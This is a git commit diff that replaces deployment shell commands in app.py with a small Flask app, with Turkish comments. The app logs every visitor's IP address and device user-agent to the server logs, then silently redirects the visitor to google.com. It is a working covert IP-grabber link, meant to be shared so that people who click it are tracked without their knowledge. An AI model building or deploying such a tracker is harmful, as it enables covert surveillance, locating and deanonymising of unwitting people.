2fc6274fec61565572b5560bcd221692aab0d592
aytacyalman045-bit <aytacyalman045@gmail.com>
2026-04-12 00:06:53 +0300

    kodlar duzeltildi

--- app.py
+++ app.py
@@ -1,6 +1,19 @@
-gh repo create repo-adin --public --source=. --remote=origin --push
-gh repo create repo-adin --public --source=. --remote=origin --push
-echo "flask" > requirements.txt
-echo "gunicorn" >> requirements.txt
-echo "web: gunicorn app:app" > Procfile
+from flask import Flask, request, redirect
+import os
+
+app = Flask(__name__)
+
+@app.route('/')
+def logger():
+    # Gelen ziyaretçinin bilgilerini terminale yazdır (Render loglarında görünür)
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    user_agent = request.user_agent.string
+    print(f"--- YENİ LOG --- IP: {user_ip} | Cihaz: {user_agent}")
+    
+    # Kullanıcıyı yönlendirmek istediğin adres (Başına mutlaka https:// koy)
+    return redirect("https://google.com")
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port)
 
